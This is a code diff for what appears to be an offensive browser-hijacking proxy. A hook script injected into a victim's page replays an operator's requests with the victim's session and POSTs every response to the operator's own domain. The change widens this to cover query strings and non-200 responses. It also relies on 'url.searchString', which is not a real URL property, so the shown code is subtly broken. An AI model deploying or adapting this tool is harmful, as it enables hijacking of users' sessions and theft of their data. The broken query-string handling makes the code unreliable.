@@ -41,10 +41,12 @@ proxy.createServer(function (req, res) {
         return;
     }
 
-    console.log(`[+] Whitelisted client ${client_ipaddr} connected to proxy`);
-    console.log("[+] Requesting: " + req.url)
-    var url = new URL(req.url).pathname;
+    var url = new URL(req.url);
+    var path = url.pathname + "?" + url.searchString;
 
+    console.log(`[+] Whitelisted client ${client_ipaddr} connected to proxy`);
+    console.log("[+] Requesting: " + path)
+	
     /* Check if request from proxy contains a body */
     if (req.headers['content-length'] > 0 || req.headers['Content-Length'] > 0) {
         var body = '';
@@ -53,7 +55,7 @@ proxy.createServer(function (req, res) {
         });
         req.on('end', function () {
             body_encoded = Buffer.from(body).toString('base64');
-            var new_task = {"id": task_counter++, "method": req.method, "url": url, "head": req.headers, "body": body_encoded}
+            var new_task = {"id": task_counter++, "method": req.method, "url": path, "head": req.headers, "body": body_encoded}
             tasks_pending.push(new_task);
             task_callbacks[new_task.id] = function (result) {
                 var body_decoded = Buffer.from(result.body, 'base64').toString();
@@ -75,7 +77,7 @@ proxy.createServer(function (req, res) {
             };
         });
 	} else {
-        var new_task = {"id": task_counter++, "method": req.method, "url": url, "head": req.headers, "body": null}
+        var new_task = {"id": task_counter++, "method": req.method, "url": path, "head": req.headers, "body": null}
         tasks_pending.push(new_task);
         task_callbacks[new_task.id] = function (result) {
             var body_decoded = Buffer.from(result.body, 'base64').toString();
@@ -231,7 +233,7 @@ var hook_file = `
 function makeRequest(id, method, url, head, body) {
     var target_http = new XMLHttpRequest();
     target_http.onreadystatechange = function() {       
-        if (target_http.readyState == 4 && target_http.status == 200) {
+        if (target_http.readyState == 4) {
             var mygg_http = new XMLHttpRequest();
             mygg_http.open("POST", "//${config.web_domain}:${config.web_port}/responses", true);
             mygg_http.setRequestHeader("Content-Type", "application/json");
